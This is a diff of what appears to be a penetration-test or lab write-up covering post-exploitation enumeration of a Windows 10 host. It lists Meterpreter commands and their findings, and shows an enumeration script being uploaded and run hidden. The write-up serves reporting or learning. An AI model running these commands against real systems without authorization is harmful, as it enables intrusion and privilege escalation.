@@ -111,22 +111,21 @@ Upon execution, the following session was established:
 | `Via` | The exploit and payload module used to establish the session. |
 
 ### Phase 2: Enumeration
-Following the successful initial access as user Apollo, a comprehensive reconnaissance was performed on the target host DESKTOP-H53BPAA using a combination of native Meterpreter post-exploitation modules and a custom batch enumeration script. All output was consolidated, compressed, and staged for exfiltration.
+Following the successful initial access as user `Apollo`, a comprehensive reconnaissance was performed on the target host DESKTOP-H53BPAA using a combination of native Meterpreter post-exploitation modules and a custom batch enumeration script. All output was consolidated, compressed, and staged for exfiltration.
 
 **Meterpreter Modules Executed:**
 
 | Module | Command | Key Findings |
 |:---|:---|:---|
 | System Info | `sysinfo` | Windows 10 22H2 Build 19045, x64, Hostname: DESKTOP-H53BPAA, Workgroup |
-| Process Privileges | `getprivs` | Only 5 basic standard user privileges present — no SeDebugPrivilege or SeImpersonatePrivilege |
+| Process Privileges | `getprivs` | Only 5 basic standard user privileges present, notably no SeDebugPrivilege or SeImpersonatePrivilege |
 | Local Exploit Suggester | `run post/multi/recon/local_exploit_suggester` | 16 viable LPE vectors identified including CVE-2024-35250 and CVE-2023-36874 |
 | Installed Applications | `run post/windows/gather/enum_applications` | Microsoft Office LTSC 2021, Mozilla Thunderbird 157, VMware Tools 12.5.3, SQL Server Compact 4.0 |
-| Logged On Users | `run post/windows/gather/enum_logged_on_users` | Current users: azrael (SID -1001), Apollo (SID -1002) |
+| Logged On Users | `run post/windows/gather/enum_logged_on_users` | Current users: azrael (SID S-1-5-21-2347659589-1334911447-931315159-1001), Apollo (SID S-1-5-21-2347659589-1334911447-931315159-1002) |
 
 <img width="442" height="154" alt="image" src="https://github.com/user-attachments/assets/8442fa49-23a5-4267-8484-d816a3b8ec88" />
 
 <img width="265" height="234" alt="image" src="https://github.com/user-attachments/assets/3d1f9fce-340b-4f61-addd-45090d91a5ce" />
-
 
 <img width="621" height="135" alt="image" src="https://github.com/user-attachments/assets/224715a3-c575-4d50-9024-1a279adbc8df" />
 
@@ -144,8 +143,8 @@ The script was uploaded to the target via Meterpreter's `upload` command and exe
  
 ```bash
 upload /home/kali/enum.bat C:\\Users\\Apollo\\Documents\\enum.bat
-shell
-C:\Users\Apollo\Documents\enum.bat
+execute -f cmd.exe -a "/c C:\\Users\\Apollo\\enum.bat" -i -H
+ls C:\\temp\\
 exit
 ```
  
